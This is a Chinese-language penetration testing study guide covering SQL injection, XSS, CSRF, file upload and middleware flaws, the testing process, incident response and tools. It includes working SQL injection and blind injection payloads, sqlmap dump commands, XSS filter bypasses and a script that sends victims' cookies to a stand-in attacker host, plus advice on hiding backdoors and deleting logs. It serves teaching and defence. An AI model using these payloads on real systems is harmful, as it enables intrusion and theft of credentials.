# 渗透测试深度技能

> 基于安全书籍的深度理解与实践总结

---

## 核心理解：渗透测试的本质

```
渗透测试 = 信息收集 + 漏洞发现 + 漏洞利用 + 权限维持 + 痕迹清理
```

**核心理念**：所有的渗透都是围绕着"找到入口"和"扩大战果"两个目标展开。

---

## 第一章：深入理解SQL注入

### 1.1 注入的本质

SQL注入的本质是**用户输入被当作SQL代码执行**。

```sql
-- 正常: 用户输入 "1"
SELECT * FROM users WHERE id = '1'

-- 注入: 用户输入 "1' OR '1'='1"
SELECT * FROM users WHERE id = '1' OR '1'='1'
```

**理解要点**：
1. 数据库如何执行我们输入的内容？
2. 字符串拼接 vs 参数化查询
3. 为什么会产生漏洞？

### 1.2 注入的分类理解

| 分类方式 | 类型 | 理解 |
|----------|------|------|
| **按回显** | 报错注入 | 让数据库报错，错误信息包含数据 |
| | 联合注入 | 用UNION合并结果 |
| | 盲注 | 没有回显，通过其他方式判断 |
| **按数据** | 数字型 | 不需要引号包裹 |
| | 字符型 | 需要引号包裹 |
| **按次数** | 一阶注入 | 当次注入生效 |
| | 二阶注入 | 先存储，再触发 |

### 1.3 注入的实战理解

**第一步：判断是否存在注入**

```
测试点: ?id=1

正常: id=1 返回正常页面
判断1: id=1' 返回错误 → 可能存在注入
判断2: id=1 AND 1=1 返回正常
判断3: id=1 AND 1=2 返回错误 → 存在注入
```

**第二步：判断注入类型**

```
数字型: id=1 AND 1=1 (不需要引号)
字符型: id='1' AND '1'='1' (需要引号)
```

**第三步：利用注入获取数据**

核心Payload:
```sql
' ORDER BY 3--     # 判断列数
' UNION SELECT 1,2,3--  # 联合查询
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
```

### 1.4 盲注的深度理解

**为什么需要盲注？**
- 页面没有错误回显
- 没有UNION注入位置
- 只能通过页面差异判断

**布尔盲注原理**:
```sql
-- 判断数据库名第一个字符
' AND (SELECT SUBSTRING(database(),1,1))='a'--

-- 如果页面正常，说明第一个字符是'a'
```

**时间盲注原理**:
```sql
-- 如果条件成立，延迟5秒
' AND SLEEP(5)--
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--
```

### 1.5 SQLMap的深度理解

**为什么用SQLMap？**
- 自动化检测注入点
- 自动识别数据库类型
- 自动化的数据获取

**核心参数理解**:
```bash
sqlmap -u "url"           # 检测注入
--dbs                     # 列出所有数据库
--tables -D "db"         # 列出指定库的所有表
--columns -T "users" -D "db"  # 列出指定表的所有列
--dump -T "users"        # 获取数据
--batch                  # 自动确认
--level=5                # 检测深度
--risk=3                 # 风险等级
--tamper="xxx"           # 绕过WAF
```

---

## 第二章：深入理解XSS

### 2.1 XSS的本质

XSS的本质是**用户输入被当作JavaScript代码执行**。

```javascript
// 正常: 用户输入 "Hello"
document.write("Hello")

// 注入: 用户输入 "<script>alert(1)</script>"
document.write("<script>alert(1)</script>")
```

**理解要点**：
1. 浏览器的同源策略
2. HTML解析 vs JavaScript执行
3. 哪些地方可以执行JS？

### 2.2 XSS的分类理解

| 类型 | 理解 | 场景 |
|------|------|------|
| 反射型 | URL参数中的XSS，一次性 | 搜索框、URL参数 |
| 存储型 | 存入数据库，长期存在 | 留言板、评论 |
| DOM型 | 前端JS处理URL引发 | 前端代码处理location |

### 2.3 XSS利用深度理解

**XSS能做什么？**
1. 窃取Cookie
2. 键盘记录
3. 钓鱼攻击
4. 蠕虫传播
5. 绕过CSRF防护

**窃取Cookie原理**:
```javascript
// 在存在XSS的地方注入
<script>
new Image().src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>
```

**绕过理解**:
```javascript
// 基本绕过
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// 编码绕过
<script>eval(atob('YWxlcnQoMSk='))</script>

// 长度绕过
<script/src=//xssyy.com/x></script>
```

---

## 第三章：深入理解CSRF

### 3.1 CSRF的本质

CSRF的本质是**伪造用户请求**。

```
用户已登录A网站
攻击者诱导用户访问B网站
B网站自动发送请求到A网站
A网站认为是用户合法操作
```

### 3.2 CSRF vs XSS

| 攻击方式 | 本质 | 关系 |
|----------|------|------|
| XSS | 盗取用户身份 | - |
| CSRF | 冒充用户身份 | XSS可以获取Token绕过CSRF |

### 3.3 CSRF防御理解

```php
// 1. Token验证 (最有效)
$_SESSION['token'] = md5(time());
// 表单中添加
<input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
// 验证
if($_POST['token'] !== $_SESSION['token']) die('CSRF');

// 2. Referer检查
if(!preg_match('/^https?:\/\/yourdomain.com/', $_SERVER['HTTP_REFERER'])) die('CSRF');

// 3. 验证码
```

---

## 第四章：深入理解文件上传

### 4.1 文件上传漏洞本质

文件上传漏洞本质是**用户上传的文件被服务器当作代码执行**。

### 4.2 利用链理解

```
上传文件 → 文件被保存 → 访问文件 → 代码被执行 → getshell
```

### 4.3 解析漏洞深度理解

**IIS解析漏洞**:
```
正常: info.jpg (图片)
攻击: info.asp;.jpg (被解析为ASP)
原理: IIS不解析;后的内容
```

**Nginx解析漏洞**:
```
正常: info.jpg
攻击: info.jpg/xxx.php
原理: xxx.php不存在 → 回退执行info.jpg
```

**Apache解析漏洞**:
```
正常: info.php.jpg
攻击: info.php.xxx (xxx无法识别 → 左移到php)
原理: 从右向左识别，直到认识的后缀
```

---

## 第五章：深入理解中间件漏洞

### 5.1 漏洞分类

| 中间件 | 常见漏洞 | 理解 |
|--------|----------|------|
| IIS | 解析漏洞、PUT漏洞 | Windows特性 |
| Apache | 解析漏洞、换行漏洞 | 多后缀、\n绕过 |
| Nginx | 解析漏洞、CRLF注入 | 配置不当 |
| Tomcat | 弱口令、WAR部署 | 管理后台 |
| JBoss | 反序列化、未授权 | Java序列化 |
| WebLogic | XMLDecoder、SSRF | Java反序列化 |

### 5.2 反序列化漏洞理解

**为什么反序列化危险？**
```
序列化: 对象 → 字符串 (可传输)
反序列化: 字符串 → 对象 (危险!)
```

如果反序列化时执行了恶意代码，就是漏洞。

**利用思路**:
1. 找到反序列化入口
2. 构造恶意序列化数据
3. 发送数据
4. 服务器反序列化时执行恶意代码

---

## 第六章：深入理解渗透测试流程

### 6.1 PTES渗透测试标准

```
1. 情报收集
   - 被动收集: 搜索引擎、WHOIS
   - 主动收集: 端口扫描、目录爆破

2. 威胁建模
   - 确定攻击目标
   - 分析攻击面

3. 漏洞分析
   - 漏洞验证
   - 漏洞确认

4. 漏洞利用
   - 获得初始shell
   - 提权

5. 后渗透
   - 横向移动
   - 权限维持
   - 清理痕迹
```

### 6.2 信息收集核心

**端口扫描的意义**:
- 知道开放了哪些服务
- 知道哪些服务可能有漏洞
- 知道攻击面有多大

**常见攻击路径**:
```
Web入口:
  找漏洞 → 获得Webshell → 提权

服务入口:
  爆破/漏洞 → 获得shell → 提权
```

---

## 第七章：深入理解应急响应

### 7.1 应急响应流程

```
1. 事件确认
   - 发生了什么？
   - 什么时候发生的？
   - 影响范围？

2. 遏制扩散
   - 断网隔离
   - 阻断攻击路径

3. 根除问题
   - 找到漏洞
   - 清除后门

4. 恢复系统
   - 修复漏洞
   - 恢复数据

5. 总结报告
   - 事件过程
   - 防御建议
```

### 7.2 日志分析深度理解

**Web日志分析**:
```bash
# 找攻击者IP
grep "attack" access.log | awk '{print $1}' | sort | uniq

# 找敏感路径
grep -E "\.php|\.asp|\.jsp" access.log

# 找异常行为
awk '{print $1,$7}' access.log | sort | uniq -c | sort -rn
```

**系统日志分析**:
```bash
# SSH登录记录
last
lastlog

# 登录失败记录
grep "Failed password" /var/log/secure

# 新建用户
grep "new user" /var/log/secure
```

---

## 第八章：深入理解工具原理

### 8.1 Nmap原理

```
nmap本质: 发送特定数据包 → 分析响应 → 判断端口状态

扫描方式:
- TCP connect: 完成三次握手 (需要权限低)
- SYN扫描: 发送SYN包 (需要root)
- UDP扫描: 发送UDP包 (慢)
```

### 8.2 MSF原理

```
MSF架构:
- 模块系统 (Exploit/Payload/Auxiliary)
- 数据库存储
- API接口

工作流程:
search → use → set options → exploit
```

### 8.3 Burp Suite原理

```
代理原理:
浏览器 → Burp代理 → 服务器
         ↓
      拦截/修改

核心功能:
- Proxy: 拦截流量
- Repeater: 重放请求
- Intruder: 暴力破解
- Scanner: 漏洞扫描
```

---

## 实战理解汇总

### 渗透测试核心思维

```
1. 找到入口点
   - Web漏洞
   - 服务漏洞
   - 弱口令

2. 扩大战果
   - 提权
   - 横向移动
   - 持久化

3. 清理痕迹
   - 删除日志
   - 隐藏后门
```

### 防御核心思维

```
1. 输入过滤
   - 参数化查询
   - HTML编码
   - 输入验证

2. 输出过滤
   - 内容转义
   - CSP策略

3. 身份验证
   - Token机制
   - 验证码
   - 二次验证
```

---

> 理解比记忆更重要。掌握原理，才能举一反三。
